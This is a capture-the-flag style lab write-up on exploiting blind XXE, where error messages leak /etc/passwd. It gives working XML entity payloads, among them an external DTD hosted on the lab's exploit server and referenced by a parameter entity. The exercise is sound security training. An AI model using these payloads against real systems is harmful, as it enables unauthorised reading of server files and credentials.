
### Exploiting blind XXE to retrieve data via error messages : PRACTITIONER

---


> Viewing any item and then pressing on `check stock` while having BURPSUITE PROXY HTTP history on.

![](check-stock.png)

> Viewing the `POST` request sent via HTTP history.

![](lab6-1.png)

> We see there is XML being used.
> Trying to view the `/etc/passwd` using this payload.
```XML
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
```
> And then calling it.
```XML
&ext;
```

![](lab6-2.png)

> Tying to use parameter entities instead.
``` XMl
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "file:///etc/passwd" > ]>
```
> And calling it.
``` XML
%ext;
```

![](lab6-3.png)

> We see that we don't see anything, hence, this might be a blind xxe injection.
> Trying to display an error message that contains the contents of the file.
``` XML
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>" >
%eval;
%error;
]>
```

1.  Create an XML parameter entity called `file` that contains the contents of the file `/etc/passwd`.
2.  Create an XML parameter entity called `eval`. In is another parameter entity called `error`.
3. `error` intentionally loads a false file name, and passes the entity `file` as the file name using `%file;`.
4. `file` contains the contents of the `/etc/passwd` file, so the name of the file will be the contents of the file.
5. Finally, use the `eval` entity which declares the `error` entity and runs it. We then use the `error` entity to view its response.

![](lab6-4.png)

> We see that we can't put it inside this document.
> This is something we know since having a parameter entity declared in the definition of another parameter entity is only parsed through external DTD.
> We can try to call this payload from an external document, or DTD.
> We can do that using the exploit server given by the lab, and then reference this external XML entity using the lab url.

> Head to the exploit server, and paste the payload above.
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>" >
%eval;
%error;
```

![](lab6-5.png)

> Saving the URL of the exploit server, and then storing the exploit using the button `store` at the bottom.

```
https://exploit-0a4e005804d421bf82c1691e013400a4.exploit-server.net/exploit
```

> Modifying the `POST` request to include this payload from the exploit server.
```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "https://exploit-0a4e005804d421bf82c1691e013400a4.exploit-server.net/exploit" > &ext;]>
```

![](lab6-6.png)

> We expect this response as we saw it above, and removed it by using parameter entities instead.
> Modifying the external reference XML entity to be a parameter entity.

```
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "https://exploit-0a4e005804d421bf82c1691e013400a4.exploit-server.net/exploit" > %ext;]>
```

![](lab6-7.png)

> We see that it tried to read the file `/nonexistent/<file contents>`, which casues an error and then prints out the error.

#### Summary

> Tried to add an XML entity, but it didnt work. So we tried using parameter entities and we saw that it passes the XML injection check.
> So we tried using the error messages, but we see that the entities are still recognized, so we add the error message payload somewhere else and reference it using an external entity.
> We then call this external entity as a parameter entity and display the results.

---
